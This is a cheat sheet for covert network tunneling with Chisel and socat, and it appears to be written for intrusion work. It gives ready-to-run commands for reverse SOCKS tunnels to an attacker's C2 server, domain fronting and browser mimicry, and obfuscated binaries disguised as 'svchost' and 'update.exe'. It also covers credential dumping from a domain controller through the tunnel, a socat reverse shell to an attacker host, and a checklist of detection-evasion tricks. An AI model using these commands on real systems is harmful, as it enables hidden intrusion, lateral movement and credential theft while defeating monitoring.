# Chisel Tunneling - Living off the Land

## Why Chisel is LoL
Single Go binary, no dependencies, compiles for any OS/arch, traffic looks like normal HTTPS WebSocket. With `--backend` flag, the server literally serves a real website - only WebSocket upgrades trigger tunneling.

## Quick Deploy

### Reverse SOCKS (most common)
```bash
# Attacker (C2)
chisel server -p 443 --reverse --tls-cert c.pem --tls-key k.pem --backend https://www.microsoft.com

# Target
chisel client --tls-skip-verify https://C2:443 R:socks
# SOCKS5 opens on attacker's 127.0.0.1:1080
```

### Forward SOCKS (pivot through compromised host)
```bash
# Pivot host
chisel server -p 8080 --socks5
# Attacker
chisel client PIVOT:8080 1080:socks
```

### Port Forward
```bash
# Reverse: target's port accessible on attacker
chisel client C2:8080 R:3389:127.0.0.1:3389
# Forward: internal target accessible on attacker
chisel client PIVOT:8080 445:INTERNAL:445
```

### Multiple tunnels in one connection
```bash
chisel client C2:443 R:socks R:8443:10.0.0.5:443 R:3389:10.0.0.10:3389
```

## Stealth Configuration

### Full stealth template
```bash
# Server - looks like a real HTTPS site
chisel server -p 443 --reverse \
  --tls-cert cert.pem --tls-key key.pem \
  --backend https://www.google.com \
  --auth operator:strongpass

# Client - mimics browser, domain fronting
chisel client \
  --auth operator:strongpass \
  --tls-skip-verify \
  --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --sni cdn.google.com \
  https://C2:443 R:socks
```

### Through corporate proxy
```bash
chisel client --proxy http://corp-proxy:8080 https://C2:443 R:socks
```

### Through TOR
```bash
chisel client --proxy socks5://127.0.0.1:9050 https://C2:443 R:socks
```

## Obfuscated Build
```bash
# Install garble
go install mvdan.cc/garble@latest

# Build obfuscated binary - strips all strings, names, paths
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 garble -literals -tiny build -o svchost -ldflags "-s -w" -trimpath .

# Windows with hidden console
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 garble -literals -tiny build -ldflags "-s -w -H windowsgui" -trimpath -o update.exe .

# Pack for size
upx --best svchost
```

## Proxychains Integration
```ini
# /etc/proxychains4.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains -q nxc smb 10.0.0.0/24
proxychains -q impacket-secretsdump domain/admin:pass@DC
proxychains -q evil-winrm -i 10.0.0.5 -u admin -p pass
```

## Double Pivot
```bash
# Attacker: chisel server -p 443 --reverse
# Host A:   chisel client C2:443 R:socks R:9001:127.0.0.1:9001
# Host A:   chisel server -p 9001 --reverse
# Host B:   chisel client HOST_A:9001 R:socks
```

## Detection Evasion
- Rename binary to system process name
- Use env vars for auth (`AUTH=user:pass`)
- `--backend` makes server look like real website
- TLS + port 443 = normal HTTPS traffic
- `--sni` for domain fronting
- Garble build removes all signatures
- CDN fronting hides C2 IP

## Socat as LoL Alternative
Socat is already installed on most Linux systems - no upload needed.

```bash
# Port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80

# Reverse shell
# Listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
# Target
socat TCP:ATTACKER:4444 EXEC:bash,pty,stderr,setsid,sigint,sane

# Encrypted tunnel (OpenSSL)
# Listener
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:127.0.0.1:22
# Client
socat TCP-LISTEN:2222,fork OPENSSL:TARGET:443,verify=0
ssh -p 2222 user@localhost

# UDP relay
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53

# TTY over TCP
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
